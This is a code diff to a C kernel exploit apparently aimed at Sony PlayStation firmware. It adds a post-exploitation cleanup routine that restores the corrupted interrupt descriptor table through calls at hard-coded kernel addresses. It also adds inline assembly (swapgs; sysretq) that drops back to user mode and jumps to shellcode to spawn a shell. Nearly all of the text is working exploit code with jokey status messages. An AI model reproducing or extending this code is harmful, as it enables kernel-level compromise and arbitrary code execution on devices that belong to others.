@@ -41,6 +41,9 @@ void payload()
 {
 	struct thread *td;
 
+	// Relys and SonyUSA-- yay!
+	_springcleaning();
+	
 	// Switch back to kernel GS base
 	asm volatile("swapgs");
 
@@ -55,7 +58,10 @@ void payload()
 		sendto(td, &args);
 	} 
 
-	while(1);
+	// return to user mode to spawn the shell
+    // store the shellcode addr to rcx
+	asm ("swapgs; sysretq;" :: "c"(user_shellcode));
+	printf("Ok! All done... I hope?\n");
 }
 
 void allocatePayload() {
@@ -168,4 +174,33 @@ int _main(void) {
 	sceNetSocketClose(sock);
 
 	return 0;
+}
+
+void _springcleaning() {
+	// Let's restore corrupted IDT !
+	printf("Ok! About to fix IDT!\n");
+	void (*setidt)() = (void *)0xFFFFFFFF82603FA0;
+	setidt(IDT_DE, 0xFFFFFFFF825FED40, SDT_SYSIGT, SEL_KPL, 0);
+	setidt(IDT_DB, 0xFFFFFFFF825FECB0, SDT_SYSIGT, SEL_KPL, 0);
+	setidt(IDT_NMI, 0xFFFFFFFF825FF3E0, SDT_SYSIGT, SEL_KPL, 2);
+	setidt(IDT_BP, 0xFFFFFFFF825FECE0, SDT_SYSIGT, SEL_UPL, 0);
+	setidt(IDT_OF, 0xFFFFFFFF825FED70, SDT_SYSIGT, SEL_KPL, 0);
+	setidt(IDT_BR, 0xFFFFFFFF825FEDA0, SDT_SYSIGT, SEL_KPL, 0);
+	setidt(IDT_UD, 0xFFFFFFFF825FEDD0, SDT_SYSIGT, SEL_KPL, 0);
+	setidt(IDT_NM, 0xFFFFFFFF825FEE00, SDT_SYSIGT, SEL_KPL, 0);
+	setidt(IDT_DF, 0xFFFFFFFF825FF0C0, SDT_SYSIGT, SEL_KPL, 1);
+	setidt(IDT_FPUGP, 0xFFFFFFFF825FEE30, SDT_SYSIGT, SEL_KPL, 0);
+	printf("Halfway Done!\n");
+	setidt(IDT_TS, 0xFFFFFFFF825FEF20, SDT_SYSIGT, SEL_KPL, 0);
+	setidt(IDT_NP, 0xFFFFFFFF825FEF40, SDT_SYSIGT, SEL_KPL, 0);
+	setidt(IDT_SS, 0xFFFFFFFF825FEF60, SDT_SYSIGT, SEL_KPL, 0);
+	setidt(IDT_GP, 0xFFFFFFFF825FF1E0, SDT_SYSIGT, SEL_KPL, 0);
+	setidt(IDT_PF, 0xFFFFFFFF825FF170, SDT_SYSIGT, SEL_KPL, 0);
+	setidt(IDT_MF, 0xFFFFFFFF825FEEC0, SDT_SYSIGT, SEL_KPL, 0);
+	setidt(IDT_AC, 0xFFFFFFFF825FEF80, SDT_SYSIGT, SEL_KPL, 0);
+	setidt(IDT_MC, 0xFFFFFFFF825FEE60, SDT_SYSIGT, SEL_KPL, 0);
+	setidt(IDT_XF, 0xFFFFFFFF825FEEF0, SDT_SYSIGT, SEL_KPL, 0);
+	printf("Do we need this one...?\n");
+	setidt(IDT_DTRACE_RET, 0xFFFFFFFF825FED10, SDT_SYSIGT, SEL_UPL, 0);
+	printf("All clean! Mother would be so proud!\nReturning you to your regularly scheduled program!\n");
 }
